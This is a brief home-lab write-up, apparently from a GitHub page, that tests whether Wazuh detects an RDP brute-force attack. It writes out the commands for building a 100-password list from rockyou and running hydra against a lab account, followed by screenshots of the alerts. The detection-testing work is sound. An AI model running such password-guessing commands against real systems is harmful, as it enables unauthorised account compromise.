
## perform brute force with a word list containing 100 passwords
* the first test will use 100 passwords to brute force account lab.local\bob. passwords taken from rockyou 2009 data breach, which come with kali linux. `head -n 100 /usr/share/wordlists/rockyou.txt > /home/kali/password_list_100.txt`
* 

 brute force from terminal: `hydra -l bob -P /home/kali/password_list_100.txt rdp://172.16.10.2/lab.local`

Hydra output:
 <img width="1372" height="792" alt="image" src="https://github.com/user-attachments/assets/75179b34-dbc7-47b5-8151-85ded7f626e5" />

Wazuh alerts:
<img width="2523" height="912" alt="image" src="https://github.com/user-attachments/assets/f4284e06-a108-4da5-b50f-b78cce345e3b" />
<img width="2520" height="830" alt="image" src="https://github.com/user-attachments/assets/61e0023d-33d4-4bf2-9b77-fcb7f330f017" />
<img width="2523" height="831" alt="image" src="https://github.com/user-attachments/assets/1cedc1de-1822-412b-b71c-c0da3479336a" />
<img width="2520" height="826" alt="image" src="https://github.com/user-attachments/assets/be96aee4-7499-4928-a203-f203a8e8908c" />



